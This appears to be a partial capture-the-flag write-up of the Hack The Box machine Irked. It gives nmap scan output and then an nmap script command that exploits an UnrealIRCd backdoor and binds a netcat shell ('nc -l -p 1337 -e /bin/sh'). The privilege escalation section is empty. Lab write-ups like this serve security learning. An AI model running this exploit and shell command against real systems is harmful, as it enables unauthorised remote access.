![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30774542-e40f-4c9b-980f-2f2d14b873b1)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Tue Jun  6 01:27:45 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,111,6697,8067 -Pn 10.10.10.117
Nmap scan report for 10.10.10.117
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37088/udp6  status
|   100024  1          50025/udp   status
|   100024  1          52269/tcp6  status
|_  100024  1          54469/tcp   status
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  6 01:28:03 2023 -- 1 IP address (1 host up) scanned in 18.05 seconds
```
cool we've got an interesting service `irc` running `UnrealIRCd`.


## Exploiting IRC

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eedf44ff-18a0-47d4-a107-006af209bcd2)

running an nmap irc backdoor script, was able to bind a shell, and connect to the shell. we are in as user `ircd`. 

```
nmap -d -p 8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -l -p 1337 -e /bin/sh' -Pn 10.10.10.117
```
nmap script payload.


## Privilege Escalation




